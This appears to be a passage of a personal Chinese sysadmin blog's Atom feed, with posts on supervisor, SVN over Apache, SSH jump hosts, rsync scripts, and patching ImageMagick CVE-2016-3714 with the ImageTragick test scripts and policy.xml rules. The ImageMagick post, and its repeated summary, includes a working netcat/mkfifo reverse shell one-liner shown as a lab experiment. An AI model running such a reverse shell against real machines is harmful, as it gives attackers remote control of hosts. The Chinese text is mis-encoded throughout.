<pre><code># supervisorctl restart inotify_bid
inotify_bid: stopped
inotify_bid: started
</code></pre><p>æŸ¥çœ‹çŠ¶æ€</p>
<pre><code># supervisorctl status inotify_bid
</code></pre><h3 id="u5E38_u7528_u7BA1_u7406_u547D_u4EE4"><a href="#u5E38_u7528_u7BA1_u7406_u547D_u4EE4" class="headerlink" title="å¸¸ç”¨ç®¡ç†å‘½ä»¤"></a>å¸¸ç”¨ç®¡ç†å‘½ä»¤</h3><ul>
<li>supervisordï¼Œåˆå§‹å¯åŠ¨Supervisordï¼Œå¯åŠ¨ã€ç®¡ç†é…ç½®ä¸­è®¾ç½®çš„è¿›ç¨‹ã€‚</li>
<li>supervisorctl stop programxxxï¼Œåœæ­¢æŸä¸€ä¸ªè¿›ç¨‹(programxxx)ï¼Œprogramxxxä¸º[program:chatdemon]é‡Œé…ç½®çš„å€¼ï¼Œè¿™ä¸ªç¤ºä¾‹å°±æ˜¯chatdemonã€‚</li>
<li>supervisorctl start programxxxï¼Œå¯åŠ¨æŸä¸ªè¿›ç¨‹</li>
<li>supervisorctl restart programxxxï¼Œé‡å¯æŸä¸ªè¿›ç¨‹</li>
<li>supervisorctl stop allï¼Œåœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stopéƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ã€‚</li>
<li>supervisorctl reloadï¼Œè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ã€‚</li>
</ul>
<p>å‚è€ƒ:</p>
<p><a href="https://fukun.org/archives/07102224.html" target="_blank" rel="external">Supervisorçš„å®‰è£…ä¸ä½¿ç”¨å…¥é—¨</a></p>
<p><a href="http://zengxh.blog.51cto.com/10650604/1713838" target="_blank" rel="external">supervisorå®‰è£…å¹¶ç›‘æ§è¿›ç¨‹</a></p>
<p><a href="http://www.cnblogs.com/shanyou/p/5075744.html" target="_blank" rel="external">è¿›ç¨‹ç›‘æ§å·¥å…·supervisor å¯åŠ¨Mongodb</a></p>
<p><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="external">ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="å®‰è£…ï¼ˆCentosï¼‰ï¼š"></a>å®‰è£…ï¼ˆCe]]>
    </summary>
    
      <category term="supervisor" scheme="http://yoursite.com/tags/supervisor/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ä¿®å¤ImageMagicæ¼æ´(CVE-2016-3714)]]></title>
    <link href="http://yoursite.com/2016/05/10/%E4%BF%AE%E5%A4%8DImageMagic%E6%BC%8F%E6%B4%9E-CVE-2016-3714/"/>
    <id>http://yoursite.com/2016/05/10/ä¿®å¤ImageMagicæ¼æ´-CVE-2016-3714/</id>
    <published>2016-05-10T10:29:23.000Z</published>
    <updated>2016-05-11T07:03:19.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="åå¼¹ Shell (Reverse Shell) å®éªŒ"></a>åå¼¹ Shell (Reverse Shell) å®éªŒ</h3><p>å°†node1çš„ shell åå¼¹ç»™ node3</p>
<p>node3ç›‘å¬2333ç«¯å£:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 ncåå¼¹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre><a id="more"></a>
<h3 id="u4FEE_u590D_u8FC7_u7A0B_3A"><a href="#u4FEE_u590D_u8FC7_u7A0B_3A" class="headerlink" title="ä¿®å¤è¿‡ç¨‹:"></a>ä¿®å¤è¿‡ç¨‹:</h3><p>å…ˆåˆ°<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">è¿™é‡Œ</a>ä¸‹è½½æ£€æµ‹è„šæœ¬:</p>
<p>æ£€æµ‹è„šæœ¬çš„ä½¿ç”¨æ–¹æ³•:</p>
<pre><code>git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
</code></pre><p>å¼€å§‹æ£€æµ‹</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 18781
SAFE

testing http with nonce: apPod0Vg
SAFE

testing rce1
UNSAFE

testing rce2
SAFE

testing MSL
UNSAFE
</code></pre><p>å¯ä»¥çœ‹åˆ°, æ˜¯ UNSAFE çš„</p>
<p>ä¿®å¤æ–¹æ¡ˆ:</p>
<p>1.åœ¨ä¸Šä¼ å›¾ç‰‡æ—¶éœ€è¦é€šè¿‡æ–‡ä»¶å†…å®¹æ¥åˆ¤æ–­ç”¨æˆ·ä¸Šä¼ çš„æ˜¯å¦ä¸ºçœŸå®å›¾ç‰‡ç±»å‹.(è¿™ä¸ªéœ€è¦å‘ŠçŸ¥å¼€å‘äººå‘˜)</p>
<p>2.ä½¿ç”¨ç­–ç•¥é…ç½®æ–‡ä»¶æ¥ç¦ç”¨ImageMagickçš„æœ‰é£é™©çš„ç¼–ç å™¨</p>
<p>å¯¹äºImageMagickå…¨å±€ç­–ç•¥é…ç½®æ–‡ä»¶åœ¨/etc/ImageMagickä¸‹å¯¹policy.xmlæœ€åä¸€è¡Œè¿›è¡Œå¢åŠ ä¸‹åˆ—é…ç½®:</p>
<pre><code>vi /etc/ImageMagick/policy.xml

&lt;policymap&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;

&lt;/policymap&gt;
</code></pre><p>å†æ¬¡è¿è¡Œæ£€æµ‹è„šæœ¬:</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
SAFE

testing delete
SAFE

testing http with local port: 47221
SAFE

testing http with nonce: hMtPw5DB
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
</code></pre><p>å‚è€ƒ:</p>
<p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2862.html" target="_blank" rel="external">CVE-2016-3714ImageMagickè¿œç¨‹æ‰§è¡Œæ¼æ´ä¿®å¤å»ºè®®</a></p>
<p><a href="http://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="external">æ¸—é€æµ‹è¯•:åå¼¹ä¸è½¬å‘å°ç»“ - Reverse Shell During the Penetration Test</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="åå¼¹ Shell (Reverse Shell) å®éªŒ"></a>åå¼¹ Shell (Reverse Shell) å®éªŒ</h3><p>å°†node1çš„ shell åå¼¹ç»™ node3</p>
<p>node3ç›‘å¬2333ç«¯å£:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 ncåå¼¹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre>]]>
    
    </summary>
    
      <category term="Reverse Shell" scheme="http://yoursite.com/tags/Reverse-Shell/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn é…ç½®http æœåŠ¡]]></title>
    <link href="http://yoursite.com/2016/05/06/svn-%E9%85%8D%E7%BD%AEhttp-%E6%9C%8D%E5%8A%A1/"/>
    <id>http://yoursite.com/2016/05/06/svn-é…ç½®http-æœåŠ¡/</id>
    <published>2016-05-06T03:07:33.000Z</published>
    <updated>2016-05-09T09:59:32.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="å®‰è£…æœåŠ¡"></a>å®‰è£…æœåŠ¡</h3><p>å®‰è£…http</p>
<pre><code>yum install -y httpd
</code></pre><p>å®‰è£… svn</p>
<pre><code>yum install -y subversion
</code></pre><p>å®‰è£…Apache SVNæ¨¡å—</p>
<pre><code>yum install -y mod_dav_svn
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>ç„¶åæ˜¯æŠŠ svn é…ç½®è¿è¡Œèµ·æ¥, æ•™ç¨‹ç½‘ä¸Šå¾ˆå¤šâ€¦ </p>
<p>å†ç„¶å.æŠŠ svn æ•´åˆè¿› apache çš„é…ç½®æ–‡ä»¶</p>
<pre><code>[root@iZ94c5cs7guZ httpd]# cat /etc/httpd/conf.d/subversion.conf
LoadModule dav_svn_module     modules/mod_dav_svn.so
LoadModule authz_svn_module   modules/mod_authz_svn.so

&lt;Location /svn&gt;    #è¿™è¡Œæ˜¯é…ç½®è®¿é—®çš„ url , æ¯”å¦‚ http://a.com/svn/repos
    DAV svn
    SVNParentPath /data/svndata        #è¿™ä¸ªå°±æ˜¯svnçš„ä¸»ç›®å½•
    AuthType Basic
    AuthName &quot;Authorization SVN: &quot;
    AuthzSVNAccessFile /data/svndata/authz    #è¿™ä¸ªæ–‡ä»¶æ˜¯ä»æŸä¸ªä»“åº“è€ƒè¿‡æ¥çš„, æƒé™è‡ªå·±æ ¹æ®éœ€æ±‚ä¿®æ”¹
    AuthUserFile /etc/httpd/conf.d/passwdfile   #è¿™ä¸ªæ–‡ä»¶æ˜¯ htpasswd ç”Ÿæˆçš„, ç”Ÿæˆçš„ç”¨æˆ·åè¦å†™è¿›ä¸Šé¢çš„ auth æ–‡ä»¶
    Require valid-user
&lt;/Location&gt;
</code></pre><p>ä¿®æ”¹ä¸€äº›æƒé™:</p>
<pre><code>chown apache:apache -R /data/svndata
chown apache:apache /etc/httpd/conf.d/passwdfile
</code></pre><p>htpasswd æ–°å¢ç”¨æˆ·:</p>
<pre><code>htpasswd  -n username
</code></pre><p>ç„¶åå¯ä»¥é…ç½® nginx åå‘ä»£ç†:</p>
<h4 id="u751F_u6210_SSL__u8BC1_u4E66"><a href="#u751F_u6210_SSL__u8BC1_u4E66" class="headerlink" title="ç”Ÿæˆ SSL è¯ä¹¦"></a>ç”Ÿæˆ SSL è¯ä¹¦</h4><p>ä¸Šé¢çš„è¿˜æ²¡æœ‰ https åŠ å¯†</p>
<pre><code># cd /etc/httpd/conf/
# openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes  #è¿™ä¸ªæ˜¯ç¼©365å¤©ä¹‹åä¸èƒ½ç”¨äº†å˜›, æ„Ÿè§‰åœ¨æŒ–å‘...
</code></pre><h4 id="u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C"><a href="#u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C" class="headerlink" title="æ·»åŠ ç”¨æˆ·çš„è„šæœ¬"></a>æ·»åŠ ç”¨æˆ·çš„è„šæœ¬</h4><pre><code>cat svn_add_http_admin.sh
#!/bin/bash

SVNPATH=/data/svndata/        #svn ä¸»ç›®å½•
PASSWDFILE=/etc/httpd/conf.d/passwdfile

read -p &quot;input user name: &quot; USER
read -p &quot;input password: &quot; PASSWD

/usr/bin/htpasswd -b $PASSWDFILE $USER $PASSWD
sed  -ri &quot;s@(^admin = .*)@\1\,$USER@&quot; $SVNPATH/authz
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://my.oschina.net/u/206356/blog/287635" target="_blank" rel="external">Centos ä¸‹æ­å»ºSVN ï¼‹ Apache æœåŠ¡å™¨</a></p>
<p><a href="http://www.opstool.com/article/282" target="_blank" rel="external">CentOSæ­å»ºNginx+Subversionç¯å¢ƒ</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Subversion_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target="_blank" rel="external">Subversion (ç®€ä½“ä¸­æ–‡)</a>)</p>
<p><a href="http://fengchj.com/?p=735" target="_blank" rel="external">Apacheæ ¸å¿ƒ(Core)æŒ‡ä»¤<location>å’Œ<directory>åŒºåˆ«</directory></location></a></p>
<p><a href="https://blog.linuxeye.com/333.html" target="_blank" rel="external">Apache htpasswdå‘½ä»¤ç”¨æ³•è¯¦è§£</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="å®‰è£…æœåŠ¡"></a>å®‰è£…æœåŠ¡</h3><p>å®‰è£…http</p>
<pre><code>yu]]>
    </summary>
    
      <category term="apache" scheme="http://yoursite.com/tags/apache/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svnhook åŒæ­¥ä»£ç åˆ°è¿œç«¯æœºå™¨]]></title>
    <link href="http://yoursite.com/2016/05/05/svnhook-%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%9C%E7%AB%AF%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/svnhook-åŒæ­¥ä»£ç åˆ°è¿œç«¯æœºå™¨/</id>
    <published>2016-05-05T07:30:03.000Z</published>
    <updated>2016-05-05T07:56:21.000Z</updated>
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä»…åšè®°å½•</p>
<p>post-commit è„šæœ¬ä¸»è¦æ˜¯é€šè¿‡ssh è¿œç¨‹å‘½ä»¤æ¥æ‰§è¡Œè‡ªåŠ¨æ›´æ–°, éœ€é…ç½® ssh å…å¯†ç ç™»é™†</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/svn_beta_update.sh&quot; 2&gt;&gt;/tmp/svn_error.log
</code></pre><p>è¿œç«¯æœºå™¨çš„åŒæ­¥ä»£ç è„šæœ¬:</p>
<pre><code>#!/bin/bash

/usr/bin/svn update /opt/www/dest/ 2&gt;&gt; svn_update_error.log
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://denglz.blog.51cto.com/3617037/1341835" target="_blank" rel="external">SVN ä½¿ç”¨ hooks è‡ªåŠ¨æ›´æ–°ä»£ç åˆ°è¿œç¨‹çš„webç›®å½•ä¸‹</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æœ¬æ–‡ä»…åšè®°å½•</p>
<p>post-commit è„šæœ¬ä¸»è¦æ˜¯é€šè¿‡ssh è¿œç¨‹å‘½ä»¤æ¥æ‰§è¡Œè‡ªåŠ¨æ›´æ–°, éœ€é…ç½® ssh å…å¯†ç ç™»é™†</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 é…ç½® ftp æœåŠ¡å™¨]]></title>
    <link href="http://yoursite.com/2016/05/05/Centos-7-%E9%85%8D%E7%BD%AE-ftp-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/Centos-7-é…ç½®-ftp-æœåŠ¡å™¨/</id>
    <published>2016-05-05T06:35:05.000Z</published>
    <updated>2016-05-05T06:39:07.000Z</updated>
    <content type="html"><![CDATA[<p>ç…§è¿™ä¸ªåš</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0å®‰è£…é…ç½®vsftp</a></p>
<p>å‚è€ƒ:</p>
<p><a href="http://www.ha97.com/4113.html" target="_blank" rel="external">Linuxä¸‹vsftpdåŸºæœ¬é…ç½®å’Œè™šæ‹Ÿç”¨æˆ·è®¾ç½®çš„å®‰å…¨æ–¹æ³•</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>ç…§è¿™ä¸ªåš</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0å®‰è£…é…ç½®vsftp</a></p>
<p>å‚è€ƒ:</p>
<p]]>
    </summary>
    
      <category term="ftp" scheme="http://yoursite.com/tags/ftp/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[é…ç½®sshå’Œansibleé€šè¿‡è·³æ¿æœºç›´æ¥ç™»å½•ç›®æ ‡æœºå™¨]]></title>
    <link href="http://yoursite.com/2016/05/03/%E9%85%8D%E7%BD%AEssh%E5%92%8Cansible%E9%80%9A%E8%BF%87%E8%B7%B3%E6%9D%BF%E6%9C%BA%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/03/é…ç½®sshå’Œansibleé€šè¿‡è·³æ¿æœºç›´æ¥ç™»å½•ç›®æ ‡æœºå™¨/</id>
    <published>2016-05-03T10:46:51.000Z</published>
    <updated>2016-05-06T01:04:21.000Z</updated>
    <content type="html"><![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="sshé…ç½®"></a>sshé…ç½®</h3><p>æœ‰è¿™æ ·çš„åœºæ™¯, æˆ‘ä»¬æœ¬åœ°çš„æœºå™¨ A éœ€è¦é€šè¿‡å…ˆç™»å½•è·³æ¿æœº B , ç„¶ååœ¨ B ä¸Šç™»å½•ç›®æ ‡æœºå™¨ C, æœ¬æ–‡ä»‹ç»å°±æ˜¯é€šè¿‡é…ç½®, å®ç°ä» A ç›´æ¥ç™»å½• C .</p>
<p>é¦–å…ˆ, å°† A çš„å…¬é’¥æ”¾åˆ° B , Cçš„ authorized_keys æ–‡ä»¶ä¸­, ç„¶åç¡®ä¿èƒ½ä» Aå…å¯†ç ç™»å½•åˆ° B. å¦‚æœçœ‹ä¸æ‡‚è¿™å¥, è¯·å…ˆå»è¡¥ä¹  ssh é€šè¿‡å¯†é’¥å…å¯†ç ç™»å½•çš„å†…å®¹. </p>
<p>åœ¨Aæœºçš„ <code>~/.ssh/config</code> ä¸­é…ç½®</p>
<pre><code>host Server_C
user=user_to_C             #è¿™ä¸ªç”¨æˆ·æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç”¨æˆ·
port=22                #è¿™ä¸ªç«¯å£æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç«¯å£
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #æœ¬åœ°ç§é’¥æ–‡ä»¶
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # è½¬å‘å‘½ä»¤, æ³¨æ„æ˜¯ A ç™»å½•åˆ° B çš„ç”¨æˆ·, IP å’Œç«¯å£
forwardagent yes
</code></pre><a id="more"></a>
<p>ç„¶ååœ¨Aä¸Šæ‰§è¡Œ ssh Server_C å°±èƒ½ç™»å½• åˆ° C äº†</p>
<h3 id="Ansible__u7684_u914D_u7F6E"><a href="#Ansible__u7684_u914D_u7F6E" class="headerlink" title="Ansible çš„é…ç½®"></a>Ansible çš„é…ç½®</h3><p>åŸæ¥ansibleå¯ä»¥ç›´æ¥ç”¨.ssh/config çš„ä¸œè¥¿â€¦åªè¦åå­—å¯¹ä¸Šå°±è¡Œäº†â€¦</p>
<p>æ¯”å¦‚ ansible/hosts é‡Œå¯ä»¥è¿™æ ·ç”¨ Server_C</p>
<pre><code>[S_C]
Server_C
</code></pre><p>ç„¶å ssh è·³è½¬ä»€ä¹ˆçš„, ä¹Ÿå¯ä»¥ç”¨ ssh é…ç½®é‡Œé¢çš„äº†</p>
<p>ä¸è¿‡å¦‚æœè·³è½¬å ,å¦‚æœç™»é™†ç›®æ ‡æœºå™¨ç”¨æˆ·ä¸æ˜¯ root ç”¨æˆ·, æ‰§è¡Œ sudo çš„æ—¶å€™ä¼šæœ‰é—®é¢˜.</p>
<h3 id="windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C"><a href="#windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C" class="headerlink" title="windows ä¸‹ç”¨ xshell é…ç½®ç™»é™†è·³è½¬"></a>windows ä¸‹ç”¨ xshell é…ç½®ç™»é™†è·³è½¬</h3><p><a href="http://blog.csdn.net/fly542/article/details/7513571" target="_blank" rel="external">xshell è‡ªåŠ¨ç™»å½•ä¸è‡ªåŠ¨è·³è½¬</a></p>
<p>xshell å®é™…æ˜¯é…ç½®Aç™»é™†åˆ°è·³æ¿æœº Bä¹‹åè‡ªåŠ¨æ‰§è¡Œçš„ ç™»é™†åˆ° C çš„å‘½ä»¤, åŒºåˆ«åœ¨äºä¸éœ€è¦å°† A çš„å…¬é’¥æ”¾åˆ° C çš„authorized_keysä¸­, è€Œæ˜¯å°† B ç™»é™† C ç”¨æˆ·çš„å…¬é’¥æ”¾åˆ° C çš„ authorized_keys æ–‡ä»¶ä¸­</p>
<p>å‚è€ƒ:</p>
<p><a href="http://mingxinglai.com/cn/2015/07/ssh-proxycommand/" target="_blank" rel="external">SSHç©¿è¶Šè·³æ¿æœºï¼šä¸€æ¡å‘½ä»¤è·¨è¶Šè·³æ¿æœºç›´æ¥ç™»é™†è¿œç¨‹è®¡ç®—æœº</a></p>
<p><a href="http://www.cweye.net/2015/07/17/ansible-jumper.html" target="_blank" rel="external">Ansibleé€šè¿‡è·³æ¿æœºç®¡ç†æœåŠ¡å™¨</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="sshé…ç½®"></a>sshé…ç½®</h3><p>æœ‰è¿™æ ·çš„åœºæ™¯, æˆ‘ä»¬æœ¬åœ°çš„æœºå™¨ A éœ€è¦é€šè¿‡å…ˆç™»å½•è·³æ¿æœº B , ç„¶ååœ¨ B ä¸Šç™»å½•ç›®æ ‡æœºå™¨ C, æœ¬æ–‡ä»‹ç»å°±æ˜¯é€šè¿‡é…ç½®, å®ç°ä» A ç›´æ¥ç™»å½• C .</p>
<p>é¦–å…ˆ, å°† A çš„å…¬é’¥æ”¾åˆ° B , Cçš„ authorized_keys æ–‡ä»¶ä¸­, ç„¶åç¡®ä¿èƒ½ä» Aå…å¯†ç ç™»å½•åˆ° B. å¦‚æœçœ‹ä¸æ‡‚è¿™å¥, è¯·å…ˆå»è¡¥ä¹  ssh é€šè¿‡å¯†é’¥å…å¯†ç ç™»å½•çš„å†…å®¹. </p>
<p>åœ¨Aæœºçš„ <code>~/.ssh/config</code> ä¸­é…ç½®</p>
<pre><code>host Server_C
user=user_to_C             #è¿™ä¸ªç”¨æˆ·æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç”¨æˆ·
port=22                #è¿™ä¸ªç«¯å£æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç«¯å£
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #æœ¬åœ°ç§é’¥æ–‡ä»¶
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # è½¬å‘å‘½ä»¤, æ³¨æ„æ˜¯ A ç™»å½•åˆ° B çš„ç”¨æˆ·, IP å’Œç«¯å£
forwardagent yes
</code></pre>]]>
    
    </summary>
    
      <category term="ansible" scheme="http://yoursite.com/tags/ansible/"/>
    
      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 é…ç½® rsync åŒæ­¥çš„ä¸€ä¸ª shell è„šæœ¬]]></title>
    <link href="http://yoursite.com/2016/05/03/Centos7-%E9%85%8D%E7%BD%AE-rsync-%E5%90%8C%E6%AD%A5%E7%9A%84%E4%B8%80%E4%B8%AA-shell-%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/05/03/Centos7-é…ç½®-rsync-åŒæ­¥çš„ä¸€ä¸ª-shell-è„šæœ¬/</id>
    <published>2016-05-03T03:05:54.000Z</published>
    <updated>2016-05-11T10:47:43.000Z</updated>
    <content type="html"><![CDATA[<p>rsync è„šæœ¬</p>
<a id="more"></a>
<pre><code>cat /root/shell/set_rsync.sh
#!/bin/bash

# æ­¤è„šæœ¬ç”¨æ¥é…ç½® rsync æœåŠ¡ç«¯

# å®šä¹‰ä¸€äº›å˜é‡

RPATH=/etc/rsyncd.d
CONF=$RPATH/rsyncd.conf
PASSWD_FILE=$RPATH/rsyncd.password
AUTH=$RPATH/rsyncd.secrets

#æœ¬æœº IP
ADDRESS=192.168.0.2
# å…è®¸è®¿é—®æœåŠ¡çš„ IP
ALLOW_IP=192.168.0.3

TAG_NAME=app_upload_files
# åŒæ­¥ç›®å½•
RSYNC_DIR=/tmp/app_upload_files
USER=user
PASSWD=&quot;passwd&quot;


# å…ˆåˆ›å»º rsync é…ç½®å­˜æ”¾ç›®å½•

[ ! -d $RPATH ] &amp;&amp; mkdir $RPATH

# åˆ›å»ºé…ç½®æ–‡ä»¶

[ ! -f $CONF ] &amp;&amp; touch $CONF
[ ! -f $PASSWD_FILE ] &amp;&amp; touch $PASSWD_FILE
[ ! -f $AUTH ] &amp;&amp; touch $AUTH

cat &gt; $CONF &lt;&lt;EOF
#pidæ–‡ä»¶ä½ç½®
pid file = /var/run/rsyncd.pid
#ç›‘å¬çš„ç«¯å£å·
port = 873

#æœ¬æœºipï¼Œè¯·è‡ªè¡Œä¿®æ”¹ä¸ºè‡ªå·±æœºå™¨çš„ip
address = $ADDRESS
#æ‰§è¡Œè´¦æˆ·
uid = nobody
gid = nobody
use chroot = yes
#æ˜¯å¦åªè¯»
read only = no
#å…è®¸è®¿é—®è®¾ç½® å¯ä»¥é…ipæ®µï¼Œä¹Ÿå¯ä»¥å¤šä¸ªipç©ºæ ¼é—´éš”ï¼Œè¯·æ”¹ä¸ºè‡ªå·±å…è®¸çš„ip
#å¦‚æœå®¢æˆ·ç«¯ä¸åœ¨ä»¥ä¸‹å…è®¸åˆ—è¡¨ä¸­ï¼Œä¼šæŠ¥ @ERROR: access denied to xxx from unknown é”™è¯¯
hosts allow= $ALLOW_IP
hosts deny=*
#æœ€å¤§è¿æ¥æ•°
max connections = 5
motd file = /etc/rsyncd.d/rsyncd.motd
#logæ–‡ä»¶ä½ç½®
log file = /var/log/rsync.log
#è¶…æ—¶æ—¶é—´
timeout = 300

#é…ç½®è¦åŒæ­¥çš„ç›®å½•ï¼Œå¯ä»¥æ·»åŠ å¤šä¸ª
#è‡ªå®šä¹‰åç§°
[$TAG_NAME]
#åŒæ­¥çš„ç›®å½•
path = $RSYNC_DIR
#æ’é™¤çš„æ–‡ä»¶
#exclude from = /etc/rsyncd.d/xxx_exclude_list
list=yes
ignore errors
#è®¤è¯ç”¨æˆ·åç§°
auth users = $USER
#ç”¨æˆ·è®¤è¯æ–‡ä»¶ï¼Œè§æ¥ä¸‹çš„ç¬¬2æ¡
secrets file = /etc/rsyncd.d/rsyncd.secrets
EOF

chmod 600 $CONF
mv /etc/rsyncd.conf{,.bak}
ln -s  $CONF  /etc/rsyncd.conf

echo $PASSWD &gt; $PASSWD_FILE
chmod 600 $PASSWD_FILE

echo &quot;$USER:$PASSWD&quot; &gt; $AUTH
chmod 600 $AUTH


# å¯åŠ¨æœåŠ¡
systemctl enable rsyncd.service
systemctl restart rsyncd.service
systemctl status rsyncd.service

# æ‰§è¡Œå®Œè„šæœ¬å, è¿˜éœ€è‡ªè¡Œé…ç½®é˜²ç«å¢™ç«¯å£ 873
</code></pre><p>ä¸¤å°æœºå™¨éƒ½æ‰§è¡Œè¿™ä¸ªè„šæœ¬</p>
<p>ç„¶åå¯ä»¥ç”¨æ‹‰çš„æ–¹å¼åŒæ­¥:</p>
<pre><code>/usr/bin/rsync -avzP --delete user@server1::app_upload_files /tmp/app_upload_files/ --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>å¦‚æœç”¨æ¨çš„æ–¹å¼:</p>
<pre><code>/usr/bin/rsync -avzP /tmp/app_upload_files/ user@server1::app_upload_files --password-file=/etc/rsyncd.d/rsyncd.password
